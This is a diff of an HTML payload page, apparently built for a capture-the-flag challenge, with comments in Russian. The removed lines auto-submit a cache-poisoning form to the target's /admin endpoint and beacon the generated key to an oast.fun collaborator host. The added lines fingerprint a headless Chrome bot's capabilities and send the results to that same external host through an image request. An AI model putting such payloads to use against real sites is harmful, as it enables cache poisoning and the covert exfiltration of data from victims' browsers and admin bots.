@@ -1,21 +1,34 @@
 <!DOCTYPE html>
-<form id="cacheForm" method="GET" action="https://tasks.goidactf.ru:20431/admin" target="_blank">
-    <input type="hidden" name="cache_key" value="cache_poison_<RANDOM>">
-</form>
-
 <script>
-const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
+// Тест возможностей headless chrome
+const tests = {
+    'WebGL': () => !!document.createElement('canvas').getContext('webgl'),
+    'WebGPU': () => !!navigator.gpu,
+    'SharedArrayBuffer': () => !!window.SharedArrayBuffer,
+    'WebAssembly': () => !!window.WebAssembly,
+    'SpeechSynthesis': () => !!window.speechSynthesis,
+    'WebUSB': () => !!navigator.usb,
+    'WebBluetooth': () => !!navigator.bluetooth,
+    'WebRTC': () => !!window.RTCPeerConnection,
+    'Clipboard API': () => !!navigator.clipboard,
+    'Storage Access API': () => !!document.hasStorageAccess,
+    'Origin Trials': () => {
+        const meta = document.createElement('meta');
+        meta.httpEquiv = 'origin-trial';
+        return !!meta.content;
+    }
+};
 
-// Генерируем случайный ключ
-const cacheKey = 'cache_poison_' + Math.random().toString(36).substr(2, 10);
+let results = '';
+for (const [name, test] of Object.entries(tests)) {
+    try {
+        results += `${name}: ${test()}\n`;
+    } catch(e) {
+        results += `${name}: ERROR\n`;
+    }
+}
 
-// Устанавливаем значение в форме
-document.getElementById('cacheForm').action = 
-    'https://tasks.goidactf.ru:20431/admin?cache_key=' + cacheKey;
-
-// Отправляем форму
-document.getElementById('cacheForm').submit();
-
-// Отправляем ключ себе
-new Image().src = COLLAB + '/?key=' + cacheKey;
+// Отправляем результаты
+new Image().src = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/?capabilities=' + 
+                  encodeURIComponent(results);
 </script>
